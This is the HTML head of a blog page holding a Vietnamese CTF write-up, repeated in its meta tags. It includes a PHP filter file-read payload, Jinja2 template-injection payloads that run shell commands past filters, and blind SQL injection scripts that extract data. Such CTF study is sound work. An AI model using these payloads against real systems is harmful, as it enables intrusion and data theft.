<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Wannagame Freshman CTF writeup" />
<meta property="og:locale" content="en" />
<meta name="description" content="WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\ \ |\ \|\ __ \|\ ___ \|\ ___ \|\ __ \|\ \ |\ \ / __ \|\ ___ \ \ \ \ \ \ \ \ \|\ \ \ \\\ \ \ \ \\\ \ \ \ \|\ \ \ \ \ \ \|\/_|\ \ \ \\\ \ \ \ \ \ __\ \ \ \ __ \ \ \\\ \ \ \ \\\ \ \ \ __ \ \ \ __\ \ \|/ \ \ \ \ \\\ \ \ \ \ \|\__\_\ \ \ \ \ \ \ \\\ \ \ \ \\\ \ \ \ \ \ \ \ \|\__\_\ \ \ \ \ \ \\\ \ \ \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\ \ \__\ \__\\\ \__\\ \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________| \|__|\|__| \|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá" />
<meta property="og:description" content="WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\ \ |\ \|\ __ \|\ ___ \|\ ___ \|\ __ \|\ \ |\ \ / __ \|\ ___ \ \ \ \ \ \ \ \ \|\ \ \ \\\ \ \ \ \\\ \ \ \ \|\ \ \ \ \ \ \|\/_|\ \ \ \\\ \ \ \ \ \ __\ \ \ \ __ \ \ \\\ \ \ \ \\\ \ \ \ __ \ \ \ __\ \ \|/ \ \ \ \ \\\ \ \ \ \ \|\__\_\ \ \ \ \ \ \ \\\ \ \ \ \\\ \ \ \ \ \ \ \ \|\__\_\ \ \ \ \ \ \\\ \ \ \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\ \ \__\ \__\\\ \__\\ \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________| \|__|\|__| \|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá" />
<link rel="canonical" href="http://localhost:4000/posts/Wannagame-Freshman/" />
<meta property="og:url" content="http://localhost:4000/posts/Wannagame-Freshman/" />
<meta property="og:site_name" content="Yuu’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-11T23:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Wannagame Freshman CTF writeup" />
<meta name="twitter:site" content="@anzuukino" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-28T00:11:44+07:00","datePublished":"2023-11-11T23:00:00+07:00","description":"WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \\u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\\ \\ |\\ \\|\\ __ \\|\\ ___ \\|\\ ___ \\|\\ __ \\|\\ \\ |\\ \\ / __ \\|\\ ___ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ \\|\\ \\ \\ \\ \\ \\ \\|\\/_|\\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ __\\ \\ \\ \\ __ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ __ \\ \\ \\ __\\ \\ \\|/ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\ \\|\\__\\_\\ \\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ \\ \\ \\|\\__\\_\\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\ \\ \\__\\ \\__\\\\\\ \\__\\\\ \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________| \\|__|\\|__| \\|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá","headline":"Wannagame Freshman CTF writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Wannagame-Freshman/"},"url":"http://localhost:4000/posts/Wannagame-Freshman/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Wannagame Freshman CTF writeup | Yuu's blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Yuu's blog">
<meta name="application-name" content="Yuu's blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }
          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();
      });
    } /* constructor() */

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isSysDarkPrefer() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get isLightMode() {
      return this.mode === ModeToggle.LIGHT_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
